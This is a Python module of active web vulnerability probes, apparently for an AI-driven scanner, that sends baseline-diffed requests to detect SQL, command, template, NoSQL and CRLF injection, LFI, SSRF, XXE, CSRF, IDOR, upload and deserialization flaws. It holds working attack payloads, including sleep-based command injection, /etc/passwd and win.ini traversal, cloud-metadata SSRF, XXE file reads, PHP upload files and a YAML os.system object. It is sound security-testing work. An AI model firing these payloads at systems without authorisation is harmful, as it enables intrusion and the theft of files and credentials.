"""Active vulnerability probes - matched-pair, baseline-diffed checks.

Each probe sends a baseline plus payloads through the guarded client and
returns request_ids plus a structured verdict. A probe never claims a bug;
it reports a signal the agent confirms with its own requests.
"""
from __future__ import annotations

import json as _json
import random
import re
import string
import urllib.parse

from .registry import Context

SQL_ERRORS = re.compile(
    r"sql syntax|mysql|mariadb|sqlite3?|postgresql|pg_query|ORA-\d{4}|"
    r"microsoft sql|incorrect syntax|db2 |sql server|pl/sql|"
    r"odbc|jdbc|sqlstate|unclosed quotation|unterminated string|"
    r"syntax error.*sql|warning.*mysql|division by zero.*sql",
    re.I,
)
_CLIENT_REDIRECT = re.compile(
    r"meta[^>]+http-equiv=['\"]?refresh|location\.(?:href|assign|replace)|"
    r"window\.location", re.I)

LFI_MARKERS = re.compile(
    r"root:x:0:0|daemon:|\[fonts\]|\[extensions\]|for 16-bit app support|"
    r"<\?php|BEGIN RSA PRIVATE KEY",
    re.I,
)


def _marker(prefix: str = "arg") -> str:
    return prefix + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def _inject(url: str, param: str, value: str) -> str:
    p = urllib.parse.urlparse(url)
    pairs = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
    if not any(k == param for k, _ in pairs):
        pairs.append((param, ""))
    pairs = [(k, value if k == param else v) for k, v in pairs]
    return urllib.parse.urlunparse(p._replace(query=urllib.parse.urlencode(pairs)))


def _inject_body(data: str, param: str, value: str) -> str:
    """Replace param's value inside a urlencoded or JSON body template."""
    try:
        obj = _json.loads(data)
        if isinstance(obj, dict):
            obj[param] = value  # append if absent, like the urlencoded path
            return _json.dumps(obj)
    except (ValueError, TypeError):
        pass
    pairs = urllib.parse.parse_qsl(data, keep_blank_values=True)
    if pairs:
        pairs = [(k, value if k == param else v) for k, v in pairs]
        if not any(k == param for k, _ in urllib.parse.parse_qsl(data)):
            pairs.append((param, value))
        return urllib.parse.urlencode(pairs)
    return data


def _send(ctx: Context, url: str, param: str, value: str,
          method: str = "GET", data: str | None = None,
          tool: str = "probe", note: str = ""):
    method = (method or "GET").upper()
    if method == "GET" or data is None:
        return ctx.client.send("GET", _inject(url, param, value), tool=tool, note=note)
    body = _inject_body(data, param, value)
    headers = {"Content-Type": "application/json"} if data.strip().startswith("{") \
        else {"Content-Type": "application/x-www-form-urlencoded"}
    return ctx.client.send(method, url, headers=headers, body=body, tool=tool, note=note)


def _similarity(a: str, b: str) -> float:
    """Cheap length+token similarity in [0,1]; enough for true/false diffs."""
    if a == b:
        return 1.0
    if not a or not b:
        return 0.0
    la, lb = len(a), len(b)
    length_sim = min(la, lb) / max(la, lb)
    ta, tb = set(re.findall(r"\w+", a)), set(re.findall(r"\w+", b))
    tok_sim = len(ta & tb) / max(len(ta | tb), 1)
    return round(0.4 * length_sim + 0.6 * tok_sim, 3)


# ---------------------------------------------------------------------------

def probe_reflection(ctx: Context, url: str, param: str,
                     method: str = "GET", data: str | None = None) -> dict:
    canary = _marker("x")
    payload = f"{canary}<>'\"&=/"
    res = _send(ctx, url, param, payload, method, data, tool="probe_reflection",
                note="xss canary")
    body = res.get("body", "")
    reflected = canary in body
    out = {"request_id": res["request_id"], "reflected": reflected}
    if not reflected:
        out["verdict"] = "not reflected"
        return out
    idx = body.find(canary)
    window = body[max(0, idx - 200): idx + 200]
    surviving = {c: c in window for c in "<>\"'&"}
    ctx_kind = "html"
    if re.search(r'<(?:script|style)[^>]*>[^<]*' + re.escape(canary), window, re.I):
        ctx_kind = "script/style"
    elif re.search(r'=\s*["\']?[^"\']*' + re.escape(canary), window):
        ctx_kind = "attribute"
    out.update({
        "verdict": "reflected",
        "context": ctx_kind,
        "unescaped_chars": [c for c, ok in surviving.items() if ok],
        "excerpt": window,
        "note": "context tells you the payload shape; unescaped < > \" ' means exploitable",
    })
    return out


def probe_sqli(ctx: Context, url: str, param: str, method: str = "GET",
               data: str | None = None) -> dict:
    tool = "probe_sqli"
    base = _send(ctx, url, param, "1", method, data, tool, "baseline")
    quote = _send(ctx, url, param, "1'", method, data, tool, "syntax probe")
    true_r = _send(ctx, url, param, "1' AND '1'='1", method, data, tool, "true")
    false_r = _send(ctx, url, param, "1' AND '1'='2", method, data, tool, "false")
    # unquoted numeric context: quote-based pairs are syntax errors there,
    # so they cannot reveal boolean-blind injection on bare int params
    ntrue_r = _send(ctx, url, param, "1 AND 1=1", method, data, tool, "ntrue")
    nfalse_r = _send(ctx, url, param, "1 AND 1=2", method, data, tool, "nfalse")

    bodies = {k: r.get("body", "") for k, r in
              (("base", base), ("quote", quote), ("true", true_r),
               ("false", false_r), ("ntrue", ntrue_r), ("nfalse", nfalse_r))}
    error_hits = {k: m.group(0) for k, b in bodies.items()
                  if (m := SQL_ERRORS.search(b))}
    sim = _similarity(bodies["true"], bodies["false"])
    nsim = _similarity(bodies["ntrue"], bodies["nfalse"])
    status_diff = true_r["status"] != false_r["status"]
    nstatus_diff = ntrue_r["status"] != nfalse_r["status"]

    verdict, signal = "no signal", None
    if error_hits and "quote" in error_hits:
        verdict, signal = "error-based candidate", error_hits.get("quote")
    elif sim < 0.85 or status_diff:
        verdict = "boolean-blind candidate"
        signal = f"quoted true/false similarity={sim}, statuses {true_r['status']}/{false_r['status']}"
    elif nsim < 0.85 or nstatus_diff:
        verdict = "boolean-blind candidate (numeric context)"
        signal = (f"unquoted true/false similarity={nsim}, statuses "
                  f"{ntrue_r['status']}/{nfalse_r['status']}")
    return {
        "verdict": verdict,
        "signal": signal,
        "request_ids": {k: r["request_id"] for k, r in
                        (("base", base), ("quote", quote),
                         ("true", true_r), ("false", false_r),
                         ("ntrue", ntrue_r), ("nfalse", nfalse_r))},
        "error_markers": error_hits,
        "true_false_similarity": sim,
        "numeric_true_false_similarity": nsim,
        "note": "confirm before record_finding: reproduce the difference and quote the differing bytes",
    }


def probe_time(ctx: Context, url: str, param: str, method: str = "GET",
               data: str | None = None, delay_s: int = 4) -> dict:
    delay_s = max(2, min(int(delay_s or 4), 10))
    tool = "probe_time"
    b1 = _send(ctx, url, param, "1", method, data, tool, "baseline-1")
    b2 = _send(ctx, url, param, "2", method, data, tool, "baseline-2")
    baseline = max(b1["elapsed_ms"], b2["elapsed_ms"])
    threshold = baseline + delay_s * 700  # 70% of requested delay above baseline

    payloads = [
        ("mysql", f"1' AND SLEEP({delay_s})-- -"),
        ("postgres", f"1' AND pg_sleep({delay_s})-- -"),
        ("mssql", f"1'; WAITFOR DELAY '0:0:{delay_s}'-- -"),
        ("cmd-unix", f"1; sleep {delay_s}"),
        ("cmd-pipe", f"1|sleep {delay_s}"),
        ("cmd-subst", f"1$(sleep {delay_s})"),
    ]
    hits, results = [], []
    for family, payload in payloads:
        r = _send(ctx, url, param, payload, method, data, tool, family)
        slow = r["elapsed_ms"] >= threshold
        results.append({"family": family, "elapsed_ms": r["elapsed_ms"],
                        "slow": slow, "request_id": r["request_id"]})
        if slow:
            hits.append(family)
    return {
        "verdict": "time-based candidate: " + ", ".join(hits) if hits else "no delay observed",
        "baseline_ms": baseline,
        "threshold_ms": round(threshold, 1),
        "results": results,
        "note": "repeat a slow family once to rule out noise before recording a finding",
    }


_SSTI_TEMPLATES = [
    ("jinja2/twig", "{{%d+%d}}"),
    ("erb/ejs", "<%%= %d+%d %%>"),
    ("freemarker/velocity", "${%d+%d}"),
    ("thymeleaf/spring", "${{%d+%d}}"),
]


def probe_ssti(ctx: Context, url: str, param: str, method: str = "GET",
               data: str | None = None) -> dict:
    base = _send(ctx, url, param, _marker("s"), method, data, "probe_ssti", "baseline")
    # a random arithmetic sum is virtually never present naturally -
    # the classic "49" from {{7*7}} collides with dates/ids everywhere
    a, b = random.randint(10000, 89999), random.randint(1000, 8999)
    expect = str(a + b)
    hits = []
    for family, tpl in _SSTI_TEMPLATES:
        payload = tpl % (a, b)
        r = _send(ctx, url, param, payload, method, data, "probe_ssti", family)
        body = r.get("body", "")
        if expect in body and payload not in body:
            hits.append({"family": family, "request_id": r["request_id"],
                         "evidence": f"{payload} -> {expect} in response"})
        elif payload in body:
            hits.append({"family": family, "request_id": r["request_id"],
                         "evidence": "reflected unrendered (not SSTI)", "negative": True})
    return {
        "verdict": ("ssti candidate: " + "; ".join(h["evidence"] for h in hits if not h.get("negative")))
        if any(not h.get("negative") for h in hits) else "no template evaluation",
        "baseline_id": base["request_id"],
        "results": hits,
    }


def probe_lfi(ctx: Context, url: str, param: str) -> dict:
    payloads = [
        ("etc-passwd-trav", "../../../../../../etc/passwd"),
        ("etc-passwd-abs", "/etc/passwd"),
        ("etc-passwd-enc", "....//....//....//etc/passwd"),
        ("win-ini", "..\\..\\..\\..\\windows\\win.ini"),
        ("win-ini-abs", "/windows/win.ini"),
        ("nullbyte", "../../../../../../etc/passwd%00"),
    ]
    hits, results = [], []
    for name, payload in payloads:
        r = _send(ctx, url, param, payload, "GET", None, "probe_lfi", name)
        m = LFI_MARKERS.search(r.get("body", ""))
        results.append({"name": name, "status": r["status"],
                        "request_id": r["request_id"],
                        "marker": m.group(0) if m else None})
        if m:
            hits.append({"name": name, "marker": m.group(0),
                         "request_id": r["request_id"]})
    return {
        "verdict": ("lfi confirmed marker: " + ", ".join(h["marker"] for h in hits))
        if hits else "no file content markers",
        "results": results,
    }


def probe_redirect(ctx: Context, url: str, param: str) -> dict:
    dest = "https://example.org/argus-canary"
    r = _send(ctx, url, param, dest, "GET", None, "probe_redirect", "external dest")
    loc = (r.get("headers") or {}).get("location", "")
    open_r = r["status"] in (301, 302, 303, 307, 308) and "example.org" in loc
    # client-side redirects never set Location: meta refresh, window.location
    body = r.get("body", "")
    client_side = (not open_r) and "example.org" in body and _CLIENT_REDIRECT.search(body)
    verdict = ("open redirect" if open_r
               else "open redirect (client-side, via meta-refresh/JS)"
               if client_side
               else "not redirected to external host")
    return {
        "verdict": verdict,
        "request_id": r["request_id"],
        "status": r["status"],
        "location": loc,
    }


def probe_crlf(ctx: Context, url: str, param: str) -> dict:
    """CRLF / response-splitting: a CRLF pair inside the parameter value.
    If the value lands in a header context (Location, Set-Cookie, custom
    echo headers) unencoded, the injected canary header appears in the
    response - proof of header control. A double-CRLF canary additionally
    checks body splitting, though it is only meaningful when the param is
    NOT reflected into the body anyway."""
    canary = _marker("acrlf")
    hdr_inj = _send(ctx, url, param, f"\r\nX-Argus-Crlf: {canary}",
                    tool="probe_crlf", note="header inject canary")
    hh = {k.lower(): v for k, v in (hdr_inj.get("headers") or {}).items()}
    header_hit = "x-argus-crlf" in hh
    # response splitting: %0d%0a%0d%0a<canary> - lands past the header block
    body_inj = _send(ctx, url, param, f"\r\n\r\n{canary}",
                     tool="probe_crlf", note="body split canary")
    body_hit = canary in (body_inj.get("body") or "")
    if header_hit:
        verdict = ("crlf injection candidate: CRLF in parameter reached the "
                   "response as a real 'x-argus-crlf' header - header "
                   "control allows session fixation, cache poisoning and "
                   "response splitting")
    elif body_hit:
        verdict = ("crlf lead: canary appears in the response body after a "
                   "double-CRLF - could be response splitting OR plain "
                   "reflection; confirm by checking whether the parameter "
                   "reflects normally")
    else:
        verdict = "no crlf signal"
    return {"verdict": verdict,
            "header_inject_id": hdr_inj["request_id"],
            "body_split_id": body_inj["request_id"],
            "injected_header": header_hit,
            "note": "verify with a second canary header (e.g. Set-Cookie) "
                    "before recording; quote the injected header verbatim"}


def probe_cors(ctx: Context, url: str) -> dict:
    evil = "https://argus-probe.invalid"
    r = ctx.client.send("GET", url, headers={"Origin": evil},
                        tool="probe_cors", note="foreign origin")
    h = {k.lower(): v for k, v in (r.get("headers") or {}).items()}
    acao = h.get("access-control-allow-origin", "")
    acac = h.get("access-control-allow-credentials", "")
    reflected = acao == evil or acao == "*"
    credentialed = acac.lower() == "true"
    verdict = "no cors issue"
    if reflected and credentialed:
        verdict = "arbitrary origin reflection WITH credentials - exploitable"
    elif acao == "*":
        verdict = "wildcard ACAO (no credentials)" if not credentialed else "wildcard + credentials"
    elif reflected:
        verdict = "origin reflected without credentials"
    return {"verdict": verdict, "request_id": r["request_id"],
            "acao": acao, "acac": acac}


def probe_method(ctx: Context, url: str) -> dict:
    r = ctx.client.send("OPTIONS", url, tool="probe_method", note="options")
    h = {k.lower(): v for k, v in (r.get("headers") or {}).items()}
    allow = h.get("allow") or h.get("access-control-allow-methods", "")
    out = {"options_id": r["request_id"], "status": r["status"], "allow": allow}
    dangerous = [m for m in ("PUT", "DELETE", "TRACE", "CONNECT")
                 if m in allow.upper()]
    if "PUT" in allow.upper():
        canary = _marker("put")
        p = ctx.client.send("PUT", url.rstrip("/") + f"/{canary}.txt",
                            body="argus method probe", tool="probe_method",
                            note="PUT canary")
        out["put_attempt"] = {"status": p["status"], "request_id": p["request_id"]}
        if p["status"] in (200, 201, 204):
            g = ctx.client.send("GET", url.rstrip("/") + f"/{canary}.txt",
                                tool="probe_method", note="verify PUT")
            out["put_verified"] = canary in g.get("body", "")
            out["put_verify_id"] = g["request_id"]
            if out["put_verified"]:
                ctx.client.send("DELETE", url.rstrip("/") + f"/{canary}.txt",
                                tool="probe_method", note="cleanup canary")
    out["dangerous_methods"] = dangerous
    out["verdict"] = ("writable method confirmed" if out.get("put_verified")
                      else f"methods: {allow or 'none advertised'}")
    return out


_ID_RE = re.compile(r"(?<![\w.-])(\d{1,12})(?![\w.-])")


def probe_idor(ctx: Context, url: str) -> dict:
    """IDOR matched-pair: fetch the object, then the same URL with the
    numeric id +/-1. A different object at the same access level means
    access control is per-object (or missing)."""
    p = urllib.parse.urlparse(url)
    where, target = "path", p.path
    m = _ID_RE.search(target)
    if not m:
        where, target = "query", p.query
        m = _ID_RE.search(target)
    if not m:
        return {"error": "no numeric id found in url; pass e.g. "
                         "/item?id=7 or /user/42/profile"}
    base = ctx.client.send("GET", url, tool="probe_idor", note="own object")

    def _shift(delta: int) -> dict:
        new_id = str(int(m.group(1)) + delta)
        comp = target[:m.start(1)] + new_id + target[m.end(1):]
        u2 = urllib.parse.urlunparse(
            p._replace(**{where: comp}))
        return ctx.client.send("GET", u2, tool="probe_idor",
                               note=f"id {new_id} (id{delta:+d})")

    neighbors = [_shift(d) for d in (1, -1)]
    results = []
    for r in neighbors:
        other = r.get("body", "")
        sim = _similarity(other, base.get("body", ""))
        results.append({"request_id": r["request_id"], "status": r["status"],
                        "similarity_to_base": sim,
                        "accessible": r["status"] == 200})
    ok = [r for r in results if r["accessible"]]
    verdict = "no other object accessible"
    if ok and all(r["similarity_to_base"] < 0.98 for r in ok):
        verdict = ("idor candidate: neighboring object ids return 200 with "
                   "different content - verify the object isn't yours")
    elif ok:
        verdict = ("neighbors accessible but content ~identical - check "
                   "whether ids even select an object")
    return {"verdict": verdict, "base_id": base["request_id"],
            "results": results,
            "note": "confirm before recording: the second object must belong "
                    "to a different principal (name/id inside the body)"}


_SSRF_MARKERS = re.compile(
    r"ami-id|instance-id|local-hostname|local-ipv4|security-credentials|"
    r"computeMetadata|Metadata-Flavor|XAwsEc2|iam/info",
    re.I,
)


def probe_ssrf(ctx: Context, url: str, param: str) -> dict:
    """SSRF matched-pair: baseline is an unresolvable canary host, then
    internal URLs (self-fetch on the target's own port, loopback name,
    cloud metadata). A 200 whose body differs from the canary error - with
    the injected URL itself stripped out - is the signal."""
    p = urllib.parse.urlparse(url)
    port = p.port or (443 if p.scheme == "https" else 80)
    canary = f"http://{_marker('nrf')}.invalid/"
    base = _send(ctx, url, param, canary, tool="probe_ssrf",
                 note="unresolvable canary")
    base_body = (base.get("body") or "").replace(canary, "")

    payloads = [
        ("self-fetch", f"http://127.0.0.1:{port}/"),
        ("loopback-name", f"http://localhost:{port}/"),
        ("decimal-ip", f"http://2130706433:{port}/"),
        ("ipv6-loopback", f"http://[::1]:{port}/"),
        ("cloud-metadata", "http://169.254.169.254/latest/meta-data/"),
    ]
    hits = []
    for name, target in payloads:
        r = _send(ctx, url, param, target, tool="probe_ssrf", note=name)
        body = r.get("body") or ""
        marker = _SSRF_MARKERS.search(body)
        sim = _similarity(body.replace(target, ""), base_body)
        hits.append({
            "name": name, "target": target, "status": r["status"],
            "request_id": r["request_id"],
            "similarity_to_canary": sim,
            "marker": marker.group(0) if marker else None,
            "differs": sim < 0.75 or r["status"] != base["status"],
        })
    strong = next((h for h in hits if h["marker"]), None)
    cand = next((h for h in hits if h["differs"] and h["status"] == 200), None)
    if strong:
        verdict = ("ssrf candidate: internal-content marker "
                   f"'{strong['marker']}' in response to {strong['name']}")
    elif cand:
        verdict = ("ssrf lead: internal URL returned 200 with different "
                   f"content than the canary ({cand['name']}) - confirm "
                   "the fetched body is really server-side output")
    else:
        verdict = "no ssrf signal"
    return {"verdict": verdict, "canary_id": base["request_id"],
            "results": hits}


def probe_xxe(ctx: Context, url: str) -> dict:
    """XXE matched-pair: baseline is a plain XML POST, then doctype
    payloads declaring external entities (local file, cloud metadata).
    File/metadata bytes in the echoed body are the signal."""
    hdr = {"Content-Type": "application/xml"}
    base = ctx.client.send("POST", url, headers=hdr,
                           body="<r>argus</r>", tool="probe_xxe",
                           note="plain xml baseline")
    payloads = [
        ("file-read",
         '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
         '"file:///etc/passwd">]><r>&xxe;</r>'),
        ("file-read-win",
         '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
         '"file:///c:/windows/win.ini">]><r>&xxe;</r>'),
        ("ssrf-via-xxe",
         '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
         '"http://169.254.169.254/latest/meta-data/">]><r>&xxe;</r>'),
    ]
    hits = []
    for name, doc in payloads:
        r = ctx.client.send("POST", url, headers=hdr, body=doc,
                            tool="probe_xxe", note=name)
        body = r.get("body") or ""
        lfi = LFI_MARKERS.search(body)
        meta = _SSRF_MARKERS.search(body)
        hits.append({"name": name, "status": r["status"],
                     "request_id": r["request_id"],
                     "marker": (lfi or meta).group(0) if (lfi or meta) else None,
                     "similarity_to_base": _similarity(
                         body, base.get("body") or "")})
    strong = next((h for h in hits if h["marker"]), None)
    if strong:
        verdict = (f"xxe candidate: marker '{strong['marker']}' resolved "
                   f"inside the XML response ({strong['name']})")
    else:
        verdict = "no xxe signal"
    return {"verdict": verdict, "base_id": base["request_id"],
            "results": hits}


_FORM_RE = re.compile(r"<form[^>]*>", re.I)
_INPUT_RE = re.compile(r"<input[^>]*>", re.I)
_CSRF_TOKEN_RE = re.compile(r"csrf|xsrf|token|nonce|authenticity|_key", re.I)


def _forms(html: str) -> list[dict]:
    """Minimal form inventory: method, action, hidden input names."""
    forms = []
    for m in _FORM_RE.finditer(html):
        tag = m.group(0)
        method = re.search(r'method=["\']?(\w+)', tag, re.I)
        action = re.search(r'action=["\']([^"\']*)', tag, re.I)
        end = html.find("</form>", m.end())
        seg = html[m.end(): end if end > 0 else len(html)]
        hidden = []
        for itag in _INPUT_RE.finditer(seg):
            t = re.search(r'type=["\']?(\w+)', itag.group(0), re.I)
            nm = re.search(r'name=["\']([^"\']+)', itag.group(0), re.I)
            if nm and (not t or t.group(1).lower() == "hidden"):
                hidden.append(nm.group(1))
        forms.append({"method": method.group(1).upper() if method else "GET",
                      "action": action.group(1) if action else "",
                      "hidden": hidden})
    return forms


_GETSTATE_RE = re.compile(
    r"chang|updat|delet|remov|add|creat|edit|modif|set|enabl|disabl|"
    r"transfer|pay|order|grant|revok|reset|confirm|approve", re.I)


def probe_csrf(ctx: Context, url: str, method: str = "GET",
               data: str | None = None) -> dict:
    """CSRF surface check: POST forms without anti-CSRF tokens plus
    session cookies missing SameSite=Lax/Strict. When `data` is given,
    also replays the action with Content-Type: text/plain - a "simple"
    content type browsers may send cross-origin without a preflight;
    an endpoint that still processes it is CSRFable. GET forms whose
    action looks state-changing are flagged as leads too - a browser
    fires a cross-origin GET with a bare <img> tag, no form needed."""
    r = ctx.client.send("GET", url, tool="probe_csrf", note="form inventory")
    body = r.get("body") or ""
    forms = _forms(body)
    post_forms = [f for f in forms if f["method"] == "POST"]
    get_forms = [f for f in forms if f["method"] == "GET"]
    stateful_gets = [f for f in get_forms
                     if _GETSTATE_RE.search(f["action"] or "")]
    unprotected = [f for f in post_forms
                   if not any(_CSRF_TOKEN_RE.search(n) for n in f["hidden"])]
    sc = (r.get("headers") or {}).get("set-cookie") or []
    if isinstance(sc, str):
        sc = [sc]
    weak_cookies = [c.split("=", 1)[0] for c in sc
                    if "samesite" not in c.lower()]
    ct_bypass = None
    if data is not None:
        p = ctx.client.send(
            "POST" if method.upper() == "GET" else method.upper(), url,
            headers={"Content-Type": "text/plain"}, body=data,
            tool="probe_csrf", note="text/plain content-type replay")
        ct_bypass = {"status": p["status"], "request_id": p["request_id"],
                     "processed": p["status"] < 400}
    if ct_bypass and ct_bypass["processed"]:
        verdict = ("csrf candidate: endpoint processed a text/plain body "
                   f"(HTTP {ct_bypass['status']}) - no content-type "
                   "enforcement, submittable cross-origin without preflight")
    elif not post_forms and stateful_gets:
        verdict = ("csrf lead: GET form(s) with state-changing-looking "
                   "actions - a GET state change needs no token and is "
                   "triggerable cross-origin by any page: "
                   + ", ".join(f["action"] for f in stateful_gets))
    elif not post_forms:
        verdict = "no state-changing forms"
    elif not unprotected:
        verdict = "post forms carry anti-csrf tokens"
    elif weak_cookies:
        verdict = ("csrf candidate: POST form(s) lack anti-CSRF token and "
                   "session cookies lack SameSite -> "
                   + ", ".join(f["action"] or "?" for f in unprotected))
    else:
        verdict = ("csrf lead: POST form(s) lack anti-CSRF token; no "
                   "session cookie seen - confirm auth is cookie-based")
    return {"verdict": verdict, "request_id": r["request_id"],
            "post_forms": post_forms, "unprotected": unprotected,
            "stateful_get_forms": stateful_gets,
            "weak_cookies": weak_cookies,
            "content_type_replay": ct_bypass}


def probe_xfh(ctx: Context, url: str) -> dict:
    """Host-header poisoning: X-Forwarded-Host canary reflected into the
    body or Location means generated absolute links can be attacker-aimed
    (password-reset poisoning, cache poisoning)."""
    canary = f"{_marker('xfh')}.argus.invalid"
    r = ctx.client.send("GET", url, headers={"X-Forwarded-Host": canary},
                        tool="probe_xfh", note="xfh canary")
    body = r.get("body") or ""
    loc = (r.get("headers") or {}).get("location", "")
    if isinstance(loc, list):
        loc = " ".join(loc)
    where = ("Location" if canary in loc
             else "body" if canary in body else "")
    verdict = (f"host-header candidate: X-Forwarded-Host reflected in {where}"
               if where else "no host-header reflection")
    return {"verdict": verdict, "request_id": r["request_id"],
            "canary": canary, "reflected_in": where}


def probe_nosqli(ctx: Context, url: str, data: str, param: str) -> dict:
    """NoSQL operator injection matched-pair: baseline JSON body, then the
    same body with the param replaced by $ne/$gt/$regex operator objects.
    A status/body flip means the server evaluated the operator."""
    hdr = {"Content-Type": "application/json"}
    try:
        template = _json.loads(data)
    except ValueError:
        return {"error": "data must be a JSON object, e.g. "
                         '{"username":"x","password":"y"}'}
    if not isinstance(template, dict):
        return {"error": "data must be a JSON object"}
    base = ctx.client.send("POST", url, headers=hdr, body=data,
                           tool="probe_nosqli", note="json baseline")
    operators = [{"$ne": None}, {"$gt": ""}, {"$regex": ".*"}]
    hits = []
    for op in operators:
        doc = dict(template)
        doc[param] = op
        r = ctx.client.send("POST", url, headers=hdr,
                            body=_json.dumps(doc), tool="probe_nosqli",
                            note=f"operator {next(iter(op))}")
        sim = _similarity(r.get("body") or "", base.get("body") or "")
        hits.append({"op": next(iter(op)), "status": r["status"],
                     "request_id": r["request_id"],
                     "similarity_to_base": sim,
                     "differs": r["status"] != base["status"] or sim < 0.7})
    flip = next((h for h in hits if h["differs"]), None)
    verdict = ("nosqli candidate: operator payload flipped the response "
               f"({flip['op']} status {flip['status']} vs baseline "
               f"{base['status']})" if flip else "no nosqli signal")
    return {"verdict": verdict, "base_id": base["request_id"],
            "results": hits}


def probe_upload(ctx: Context, url: str) -> dict:
    """Unrestricted-upload check: a benign control plus active-content
    files; the stored file being served back with bytes intact is the
    signal (stored XSS / webshell depending on stack)."""
    canary = _marker("upl")

    def _multipart(fname: str, ctype: str, content: str):
        b = "----argus" + canary
        body = (f"--{b}\r\nContent-Disposition: form-data; name=\"file\"; "
                f"filename=\"{fname}\"\r\nContent-Type: {ctype}\r\n\r\n"
                f"{content}\r\n--{b}--\r\n")
        return body, {"Content-Type": f"multipart/form-data; boundary={b}"}

    payloads = [
        ("control-txt", f"{canary}.txt", "text/plain", canary),
        ("svg-xss", f"{canary}.svg", "image/svg+xml",
         '<svg xmlns="http://www.w3.org/2000/svg">'
         f"<script>/*{canary}*/alert(1)</script></svg>"),
        ("php-rce", f"{canary}.php", "application/x-php",
         f"<?php /*{canary}*/ echo 'x'; ?>"),
        ("double-ext", f"{canary}.php.jpg", "image/jpeg",
         f"<?php /*{canary}*/ echo 'x'; ?>"),
        ("phtml", f"{canary}.phtml", "application/x-php",
         f"<?php /*{canary}*/ echo 'x'; ?>"),
        ("ctype-spoof", f"{canary}.php", "image/jpeg",
         f"<?php /*{canary}*/ echo 'x'; ?>"),
    ]
    results = []
    for name, fname, ctype, content in payloads:
        body, hdr = _multipart(fname, ctype, content)
        up = ctx.client.send("POST", url, headers=hdr, body=body,
                             tool="probe_upload", note=name)
        entry = {"name": name, "status": up["status"],
                 "request_id": up["request_id"], "served": False}
        m = re.search(r'"(?:url|path|location|file)"\s*:\s*"([^"]+)"',
                      up.get("body") or "")
        if m:
            entry["stored_path"] = m.group(1)
            g = ctx.client.send("GET",
                                urllib.parse.urljoin(url, m.group(1)),
                                tool="probe_upload", note=f"fetch {name}")
            entry["fetch_id"] = g["request_id"]
            entry["served"] = canary in (g.get("body") or "")
        results.append(entry)
    served = [r for r in results if r["served"]]
    active = [r for r in served if r["name"] != "control-txt"]
    if active:
        verdict = ("upload candidate: active file type stored and served "
                   f"({', '.join(r['name'] for r in active)}) - stored "
                   "XSS or code execution depending on server stack")
    elif served:
        verdict = ("uploads are stored and served; active types blocked "
                   "or undisclosed - try extensions/content manually")
    else:
        verdict = "no upload accepted or stored path undisclosed"
    return {"verdict": verdict, "results": results}


def probe_race(ctx: Context, url: str, method: str = "GET",
               data: str | None = None, n: int = 8) -> dict:
    """TOCTOU / limit-exceeded check: fire n concurrent identical
    requests, then disambiguate with a serial baseline.

    A signature that also appears serially is not a race: if two
    sequential probes succeed as well, the action is simply repeatable.
    Race evidence is when the burst succeeds N times while the serial
    probes now fail - the limited action was crossed under concurrency.

    Sends still respect the shared rate limiter - for true wire
    concurrency run with a high --rate or no cap."""
    import concurrent.futures
    import time as _time

    def _fire(note="concurrent burst") -> dict:
        return ctx.client.send(method, url, body=data,
                               tool="probe_race", note=note)

    def _ok(r):
        return 200 <= r["status"] < 300

    n = max(2, min(int(n or 8), 16))
    t0 = _time.monotonic()
    with concurrent.futures.ThreadPoolExecutor(max_workers=n) as ex:
        rs = list(ex.map(lambda _: _fire(), range(n)))
    burst_s = round(_time.monotonic() - t0, 2)
    statuses: dict[int, int] = {}
    for r in rs:
        statuses[r["status"]] = statuses.get(r["status"], 0) + 1
    ok = [r for r in rs if _ok(r)]
    # If the burst took ~as long as the requests would serially, nothing
    # actually overlapped and a multi-success cannot evidence a race.
    serial_est = sum(r.get("elapsed_ms", 0) for r in rs) / 1000
    overlapped = not serial_est or burst_s < serial_est * 0.85
    serial: list[dict] = []
    if len(ok) > 1:
        serial = [_fire("serial baseline"), _fire("serial baseline")]
    s_ok = [r for r in serial if _ok(r)]
    if len(ok) > 1 and len(s_ok) == len(serial):
        # repeatable is provable without overlap - check it first
        verdict = (f"{len(ok)}/{n} burst successes but {len(s_ok)}/"
                   f"{len(serial)} serial probes also succeeded - the "
                   "action is repeatable, not a one-time race")
    elif len(ok) > 1 and not overlapped:
        verdict = ("inconclusive: burst requests were serialized "
                   f"(burst {burst_s}s ~= serial estimate {serial_est:.1f}s) - "
                   "raise --rate or increase n and retry")
    elif len(ok) > 1:
        verdict = (f"race candidate: {len(ok)}/{n} concurrent requests "
                   f"succeeded but serial probes now return "
                   f"{[r['status'] for r in serial]} - a limited action "
                   "was crossed under concurrency; confirm by checking "
                   "server-side state")
    elif len(ok) == 1:
        verdict = ("single success in burst - no race window observed "
                   "(or the action was already consumed)")
    else:
        verdict = ("no success in burst; statuses "
                   f"{statuses} - endpoint may not be one-time")
    return {"verdict": verdict, "statuses": statuses,
            "burst_seconds": burst_s, "overlapped": overlapped,
            "serial_statuses": [r["status"] for r in serial],
            "results": [{"status": r["status"],
                         "request_id": r["request_id"]} for r in rs]}


_DESER_ERRORS = re.compile(
    r"ObjectInputStream|InvalidClassException|ClassNotFoundException|"
    r"StreamCorruptedException|unserialize|__wakeup|Unpickler|"
    r"pickle\.loads|cannot deserialize|SerializationException|"
    r"yaml_parse|marshal\.load|BinaryFormatter|JsonSerializer",
    re.I,
)


def probe_deserialize(ctx: Context, url: str, param: str) -> dict:
    """Deserialization surface check: baseline then magic-bytes payloads
    per ecosystem. A framework deserialization error means the parser
    actually processes the field - real attack surface, not a guess."""
    base = _send(ctx, url, param, "argus-plain", tool="probe_deserialize",
                 note="baseline")
    base_err = _DESER_ERRORS.search(base.get("body") or "")
    payloads = [
        ("java-b64", "rO0ABXQABHRlc3Q="),
        ("php-object", 'O:8:"stdClass":0:{}'),
        ("php-array", 'a:1:{s:1:"a";s:1:"b";}'),
        ("python-pickle", "c__builtin__\nset\n"),
        ("node-serialize", '{"x":"_$$ND_FUNC$$_function(){return 1}()"}'),
        ("yaml-python", "!!python/object/apply:os.system ['id']"),
        ("dotnet-psobject", '{"$type":"System.Object"}'),
    ]
    hits = []
    for name, pl in payloads:
        r = _send(ctx, url, param, pl, tool="probe_deserialize", note=name)
        body = r.get("body") or ""
        m = _DESER_ERRORS.search(body)
        hits.append({"name": name, "status": r["status"],
                     "request_id": r["request_id"],
                     "marker": m.group(0) if m else None})
